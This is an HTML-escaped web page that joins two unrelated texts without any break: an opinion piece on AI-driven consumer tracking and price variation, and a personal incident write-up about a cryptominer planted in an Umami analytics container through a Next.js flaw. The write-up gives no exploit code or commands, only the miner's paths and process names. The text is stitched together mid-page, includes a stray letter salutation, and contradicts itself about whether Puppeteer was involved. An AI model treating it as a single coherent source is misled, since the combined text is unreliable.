    &lt;p&gt;As if it’s not bad enough that artificial intelligence is coming for your job—or at least making it worse—and the data centers fueling it are raising your utility bills and destroying your environment. Turns out, AI is also spying on your shopping habits and using that information not only to sell you more things, but at a higher price.&lt;/p&gt;
    &lt;p&gt;This has all been illustrated by a string of reports on how companies are using AI to target consumers. The reports make clear that while Big Tech has pushed AI on Americans as a tool to make their lives easier, the technology may in fact be making their lives even harder. This is what happens when any large, concentrated industry is allowed to grow unregulated, and all signs suggest it will get much worse.&lt;/p&gt;
    &lt;p&gt;In October, the Vanderbilt Policy Accelerator published research showing that companies use loyalty programs to hook consumers, creating a captive audience they can track. Because consumers opt into these programs in the hopes of discounts and rewards, the programs are exempt from many state and federal laws about surveillance. And some companies eagerly abuse that legal opening.&lt;/p&gt;
    &lt;p&gt;Of course, loyalty programs pre-date AI, not to mention the internet itself. But gone are the punch cards of yore. The Vanderbilt report’s lead example is the McDonald’s Monopoly game promotion, which has been around for decades but has now gone digital. Let’s say you win a food item on a peel-off token; to redeem it, you have to use the restaurant’s app, and that requires forfeiting one’s privacy:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;To be eligible for these prizes, customers must agree to be tracked on far more than their Big Mac purchases. McDonald’s nearly 10,000-word privacy policy notes how the company can monitor customers’ precise geolocation, browsing history, app interactions, and social media activity. The company then uses this data to train its artificial intelligence models and build profiles on its customers—predicting their “preferences, characteristics, psychological trends, predispositions, behavior, attitudes, intelligence, abilities, or aptitudes.” McDonald’s leverages these psychological profiles to drive repeat customer engagement over time.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;If McDonald’s succeeds in its goal of reaching 250 active loyalty users by 2027, the report adds, the company “will hold psychological and behavioral profiles on a quarter of a billion consumers—a scale rivaling that of a national intelligence agency.”&lt;/p&gt;
    &lt;p&gt;The central goal here, at least as far as we know, is to drive more McDonald’s sales—both on an individual level and across its entire customer base—by harvesting data. That’s bad enough. But sometimes companies are deploying AI to actually trick you into paying even more for things.&lt;/p&gt;
    &lt;p&gt;Groundwork Collaborative, Consumer Reports, and More Perfect Union collaborated on an investigation released this month showing that Instacart, the grocery shopping and delivery app, used AI-enabled data collection to manipulate and change prices. The investigators sent 437 shoppers out in four cities and placed items in their Instacart shopping carts at the same time. The results showed that almost three-quarters of the items had prices that varied, and prices for the same items could vary as much as 23 percent. These variations are often invisible to consumers.&lt;/p&gt;
    &lt;p&gt;Dynamic pricing has long been used by airlines to shift prices as demand changes, and it’s been adapted to consumer goods at online retailers, like Ticketmaster. But AI has turbocharged the practice, making it easier to target price changes to specific customers based on geolocation and IP data, in an attempt to maximize the amount a customer will pay. Customers are largely ignorant of this fact—because companies are loath to disclose it prominently—and in some cases may not have much choice. Many families use apps like Instacart for the convenience; they may not have the time or ability to physically shop in a store themselves. But now we know what they’re paying for this convenience: The Instacart report estimates that the hidden pricing differences could amount to as much as $1,200 a year for some customers.&lt;/p&gt;
    &lt;p&gt;It’s hard to set a shopping budget if you can’t be sure what your grocery staples will cost on any given week. In other words—trigger alert, President Trump!—it’s an affordability issue. Representative Greg Casar, a Texas Democrat, has introduced legislation to regulate how companies can use AI to set prices and wages, but it’s unlikely to go anywhere in this Republican-led government. In fact, Trump issued an executive order this month promising to investigate and withhold federal funds from states that pass “cumbersome” AI regulations.&lt;/p&gt;
    &lt;p&gt;Some states have promised to push for new regulations regardless. That’s what Americans want: Half of Americans are more concerned than excited about AI, and 61 percent want more control over how it is used in their lives. They’re also weary of the second-order effects of building up AI, like the toll of data centers on their communities.&lt;/p&gt;
    &lt;p&gt;But reform-minded politicians are playing catchup while the AI bubble continues to balloon, enriching a handful of companies that are propping up an otherwise ho-hum stock market. Meanwhile, Americans who want to be treated fairly as consumers find themselves getting a bad deal. They can’t shop for Cheerios or a plane ticket for the holidays without wondering just how severely they’re being screwed by AI-trained algorithms. A reckoning is coming. The bubble will probably burst, and Americans’ retirement savings will plummet. But whom will they blame for the damage? The wise policies of the future depend on naming the right villains today.&lt;/p&gt;

      &lt;p&gt;Dear Mr Jake Saunders,&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;We have indications that there was an attack from your server. Please take all necessary measures to avoid this in the future and to solve the issue.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;We also request that you send a short response to us. This response should contain information about how this could have happened and what you intend to do about it. In the event that the following steps are not completed successfully, your server can be blocked at any time after the 2025-12-17 12:46:15 +0100.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;Attached was evidence of network scanning from my server to some IP range in Thailand. Great. Nothing says “good morning” like an abuse report and the threat of getting your infrastructure shut down in 4 hours.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Background: I run a Hetzner server with Coolify. It runs all my stuff, like my little corner of the internet:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;My IoT Side Project&lt;/item&gt;
      &lt;item&gt;This Blog&lt;/item&gt;
      &lt;item&gt;Analytics&lt;/item&gt;
      &lt;item&gt;My dads site (he’s an electrician)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;8:30 AM: Oh Fuck&lt;/head&gt;
    &lt;p&gt;First thing I did was SSH in and check the load average:&lt;/p&gt;
    &lt;p&gt;For context, my load average is normally around 0.5-1.0. Fifteen is “something is very wrong.”&lt;/p&gt;
    &lt;p&gt;I ran &lt;code&gt;ps aux&lt;/code&gt; to see what was eating my CPU:&lt;/p&gt;
    &lt;p&gt;819% CPU usage. On a process called &lt;code&gt;javae&lt;/code&gt; running from &lt;code&gt;/tmp/.XIN-unix/&lt;/code&gt;. And multiple &lt;code&gt;xmrig&lt;/code&gt; processes - that’s
literally cryptocurrency mining software (Monero, specifically).&lt;/p&gt;
    &lt;p&gt;I’d been mining cryptocurrency for someone since December 7th. For ten days. Brilliant.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Investigation&lt;/head&gt;
    &lt;p&gt;My first thought was “I’m completely fucked.” Cryptominers on the host, running for over a week - time to nuke everything from orbit and rebuild, right?&lt;/p&gt;
    &lt;p&gt;But then I noticed something interesting. All these processes were running as user &lt;code&gt;1001&lt;/code&gt;. Not root. Not a system user.
UID 1001.&lt;/p&gt;
    &lt;p&gt;Let me check what’s actually running:&lt;/p&gt;
    &lt;p&gt;I’ve got about 20 containers running via Coolify (my self-hosted PaaS). Inventronix (my IoT platform), some monitoring stuff, Grafana, a few experiments.&lt;/p&gt;
    &lt;p&gt;And Umami - a privacy-focused analytics tool I’d re-deployed 9 days ago to track traffic on my blog.&lt;/p&gt;
    &lt;p&gt;Wait. 9 days ago. The malware started December 7th. Same timeline.&lt;/p&gt;
    &lt;p&gt;Let me check which container has user 1001:&lt;/p&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;p&gt;There it is. Container &lt;code&gt;a42f72cb1bc5&lt;/code&gt; - that’s my Umami analytics container. And it’s got a whole &lt;code&gt;xmrig-6.24.0&lt;/code&gt;
directory sitting in what should be Next.js server internals.&lt;/p&gt;
    &lt;p&gt;The mining command in the process list confirmed it:&lt;/p&gt;
    &lt;p&gt;Someone had exploited my analytics container and was mining Monero using my CPU. Nice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait, I Don’t Use Next.js&lt;/head&gt;
    &lt;p&gt;Here’s the kicker. A few days ago I saw a Reddit post about a critical Next.js/Puppeteer RCE vulnerability ( CVE-2025-66478). My immediate reaction was “lol who cares, I don’t run Next.js.”&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Oh my sweet summer child.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Except… Umami is built with Next.js. I did not know this, nor did I bother looking. Oops.&lt;/p&gt;
    &lt;p&gt;The vulnerability (CVE-2025-66478) was in Next.js’s React Server Components deserialization. The “Flight” protocol that RSC uses to serialize/deserialize data between client and server had an unsafe deserialization flaw. An attacker could send a specially crafted HTTP request with a malicious payload to any App Router endpoint, and when deserialized, it would execute arbitrary code on the server.&lt;/p&gt;
    &lt;p&gt;No Puppeteer involved - just broken deserialization in the RSC protocol itself. The attack flow:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Attacker sends crafted HTTP request to Umami’s Next.js endpoint&lt;/item&gt;
      &lt;item&gt;RSC deserializes the malicious payload&lt;/item&gt;
      &lt;item&gt;RCE achieved via unsafe deserialization&lt;/item&gt;
      &lt;item&gt;Download and install cryptominers&lt;/item&gt;
      &lt;item&gt;Profit (for them)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So much for “I don’t use Next.js.”&lt;/p&gt;
    &lt;head rend="h2"&gt;The Panic: Has It Escaped the Container?&lt;/head&gt;
    &lt;p&gt;This is where I started to properly panic. Looking at that process list:&lt;/p&gt;
    &lt;p&gt;That path - &lt;code&gt;/tmp/.XIN-unix/javae&lt;/code&gt; - looks like it’s on the host filesystem, not inside a container. If the malware
had escaped the container onto my actual server, I’d need to:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Assume everything is compromised&lt;/item&gt;
      &lt;item&gt;Check for rootkits, backdoors, persistence mechanisms&lt;/item&gt;
      &lt;item&gt;Probably rebuild from scratch&lt;/item&gt;
      &lt;item&gt;Spend my entire day unfucking this&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I checked for persistence mechanisms:&lt;/p&gt;
    &lt;p&gt;No malicious cron jobs. No fake systemd services pretending to be &lt;code&gt;nginxs&lt;/code&gt; or &lt;code&gt;apaches&lt;/code&gt; (common trick to blend in).
That’s… good?&lt;/p&gt;
    &lt;p&gt;But I still needed to know: Did the malware actually escape the container or not?&lt;/p&gt;
    &lt;head rend="h2"&gt;The Moment of Truth&lt;/head&gt;
    &lt;p&gt;Here’s the test. If &lt;code&gt;/tmp/.XIN-unix/javae&lt;/code&gt; exists on my host, I’m fucked. If it doesn’t exist, then what I’m seeing is
just Docker’s default behavior of showing container processes in the host’s &lt;code&gt;ps&lt;/code&gt; output, but they’re actually isolated.&lt;/p&gt;
    &lt;p&gt;IT NEVER ESCAPED.&lt;/p&gt;
    &lt;p&gt;The malware was entirely contained within the Umami container. When you run &lt;code&gt;ps aux&lt;/code&gt; on a Docker host, you see processes
from all containers because they share the same kernel. But those processes are in their own mount namespace - they
can’t see or touch the host filesystem.&lt;/p&gt;
    &lt;p&gt;Let me verify what user that container was actually running as:&lt;/p&gt;
    &lt;p&gt;This is why I’m not fucked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Container ran as user &lt;code&gt;nextjs&lt;/code&gt;(UID 1001), not root ✅&lt;/item&gt;
      &lt;item&gt;Container was not privileged ✅&lt;/item&gt;
      &lt;item&gt;Container had zero volume mounts ✅&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The malware could:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Run processes inside the container ✅&lt;/item&gt;
      &lt;item&gt;Mine cryptocurrency ✅&lt;/item&gt;
      &lt;item&gt;Scan networks (hence the Hetzner abuse report) ✅&lt;/item&gt;
      &lt;item&gt;Consume 100% CPU ✅&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The malware could NOT:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Access the host filesystem ❌&lt;/item&gt;
      &lt;item&gt;Install cron jobs ❌&lt;/item&gt;
      &lt;item&gt;Create systemd services ❌&lt;/item&gt;
      &lt;item&gt;Persist across container restarts ❌&lt;/item&gt;
      &lt;item&gt;Escape to other containers ❌&lt;/item&gt;
      &lt;item&gt;Install rootkits ❌&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Container isolation actually worked. Nice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why This Matters: Dockerfiles vs. Auto-Generated Images&lt;/head&gt;
    &lt;p&gt;Here’s the thing that saved me. I write my own Dockerfiles for my applications. I don’t use auto-generation tools like Nixpacks (which Coolify supports) that default to &lt;code&gt;USER root&lt;/code&gt; in containers.&lt;/p&gt;
    &lt;p&gt;The Reddit post I’d seen earlier? That guy got completely owned because his container was running as root. The malware could:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install cron jobs for persistence&lt;/item&gt;
      &lt;item&gt;Create systemd services&lt;/item&gt;
      &lt;item&gt;Write anywhere on the filesystem&lt;/item&gt;
      &lt;item&gt;Survive reboots&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;His fix required a full server rebuild because he couldn’t trust anything anymore. Mine required… deleting a container.&lt;/p&gt;
    &lt;p&gt;What I did not do, was keep track of the tolling I was using and what tooling that was using. In fact, I installed Umami from Coolify’s services screen. I didn’t even configure it.&lt;/p&gt;
    &lt;p&gt;Obviously none of this is Umami’s fault by the way. They released a fix for their free software like a week ago. I just didn’t think to do anything about it.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Fix&lt;/head&gt;
    &lt;p&gt;CPU back to normal. All those cryptomining processes? Gone. They only existed inside the container.&lt;/p&gt;
    &lt;p&gt;I also enabled UFW (which I should have done ages ago):&lt;/p&gt;
    &lt;p&gt;This blocks all inbound connections except SSH, HTTP, and HTTPS. No more exposed PostgreSQL ports, no more RabbitMQ ports open to the internet.&lt;/p&gt;
    &lt;p&gt;I sent Hetzner a brief explanation:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Investigation complete. The scanning originated from a compromised Umami analytics container (CVE-2025-66478 - Next.js/Puppeteer RCE).&lt;/p&gt;
      &lt;p&gt;The container ran as non-root user with no privileged access or host mounts, so the compromise was fully contained. Container has been removed and firewall hardened.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;They closed the ticket within an hour.&lt;/p&gt;
    &lt;head rend="h2"&gt;Lessons Learned&lt;/head&gt;
    &lt;head rend="h3"&gt;1. “I don’t use X” doesn’t mean your dependencies don’t use X&lt;/head&gt;
    &lt;p&gt;I don’t write Next.js applications. But I run third-party tools that are built with Next.js. When CVE-2025-66478 was disclosed, I thought “not my problem.” Wrong.&lt;/p&gt;
    &lt;p&gt;Know what your dependencies are actually built with. That “simple analytics tool” is a full web application with a complex stack.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. Container isolation works (when configured properly)&lt;/head&gt;
    &lt;p&gt;This could have been so much worse. If that container had been running as root, or had volume mounts to sensitive directories, or had access to the Docker socket, I’d be writing a very different blog post about rebuilding my entire infrastructure.&lt;/p&gt;
    &lt;p&gt;Instead, I deleted one container and moved on with my day.&lt;/p&gt;
    &lt;p&gt;Write your own Dockerfiles. Understand what user your processes run as. Avoid &lt;code&gt;USER root&lt;/code&gt; unless you have a very
good reason. Don’t mount volumes you don’t need. Don’t give containers &lt;code&gt;--privileged&lt;/code&gt; access.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. The sophistication gap&lt;/head&gt;
    &lt;p&gt;This malware wasn’t like those people who auto-poll for &lt;code&gt;/wpadmin&lt;/code&gt; every time I make a DNS change. This was spicy.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Disguised itself in legitimate-looking paths (&lt;code&gt;/app/node_modules/next/dist/server/lib/&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Used process names that blend in (&lt;code&gt;javae&lt;/code&gt;,&lt;code&gt;runnv&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Attempted to establish persistence&lt;/item&gt;
      &lt;item&gt;According to other reports, even had “killer scripts” to murder competing miners&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But it was still limited by container isolation. Good security practices beat sophisticated malware.&lt;/p&gt;
    &lt;head rend="h3"&gt;4. Defense in depth matters&lt;/head&gt;
    &lt;p&gt;Even though the container isolation held, I still should have:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Had a firewall enabled from day one (not “I’ll do it later”)&lt;/item&gt;
      &lt;item&gt;Been running fail2ban to stop those SSH brute force attempts&lt;/item&gt;
      &lt;item&gt;Had proper monitoring/alerting (I only noticed because of the Hetzner email)&lt;/item&gt;
      &lt;item&gt;Updated Umami when the CVE was disclosed&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I got lucky. Container isolation saved me from my own laziness.&lt;/p&gt;
    &lt;head rend="h2"&gt;What I’m Doing Differently&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;No more Umami. I’m salty. The CVE was disclosed, they patched it, but I’m not running Next.js-based analytics anymore. Considering GoatCounter (written in Go) or just parsing server logs with GoAccess.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;Audit all third-party containers. Going through everything I run and checking: &lt;list rend="ul"&gt;&lt;item&gt;What user does it run as?&lt;/item&gt;&lt;item&gt;What volumes does it have?&lt;/item&gt;&lt;item&gt;When was it last updated?&lt;/item&gt;&lt;item&gt;Do I actually need it?&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;SSH hardening. Moving to key-based authentication only, disabling password auth, and setting up fail2ban.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Proper monitoring. Setting up alerts for CPU usage, load average, and suspicious network activity. I shouldn’t find out about compromises from my hosting provider.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;Regular security updates. No more “I’ll update it later.” If there’s a CVE, I patch or I remove the service.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Weird Silver Lining&lt;/head&gt;
    &lt;p&gt;This was actually a pretty good learning experience. I got to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Practice incident response on a real compromise&lt;/item&gt;
      &lt;item&gt;Prove that container isolation actually works&lt;/item&gt;
      &lt;item&gt;Learn about Docker namespaces, user mapping, and privilege boundaries&lt;/item&gt;
      &lt;item&gt;Harden my infrastructure without the pressure of active data loss&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And I only lost about 2 hours of my morning before work. Could’ve been way worse.&lt;/p&gt;
    &lt;p&gt;Though I do wonder how much Monero I mined for that dickhead. Based on the CPU usage and duration… probably enough for them to have a nice lunch. You’re welcome, mysterious attacker. Hope you enjoyed it.&lt;/p&gt;
    &lt;head rend="h2"&gt;TL;DR&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Umami analytics (built with Next.js) had a Puppeteer RCE vulnerability&lt;/item&gt;
      &lt;item&gt;Got exploited, installed cryptominers&lt;/item&gt;
      &lt;item&gt;Mined Monero for 10 days at 1000%+ CPU&lt;/item&gt;
      &lt;item&gt;Container isolation saved me because it ran as non-root with no mounts&lt;/item&gt;
      &lt;item&gt;Fix: &lt;code&gt;docker rm umami&lt;/code&gt;and enable firewall&lt;/item&gt;
      &lt;item&gt;Lesson: Know what your dependencies are built with, and configure containers properly&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
